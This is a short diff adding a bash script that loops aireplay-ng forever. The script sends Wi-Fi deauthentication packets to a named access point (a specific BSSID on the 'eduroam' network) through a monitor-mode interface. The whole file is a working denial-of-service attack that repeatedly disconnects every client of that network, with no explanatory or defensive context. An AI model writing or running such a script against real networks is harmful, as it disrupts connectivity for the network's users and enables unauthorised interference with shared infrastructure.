@@ -1,0 +1,6 @@
+#!/bin/bash
+while [ 0 -lt 1 ]; do
+       aireplay-ng -0 1 -a 70:79:B3:F7:27:C1 -e "eduroam" wlp2s0mon
+done
+
+#70:79:B3:F7:27:C1
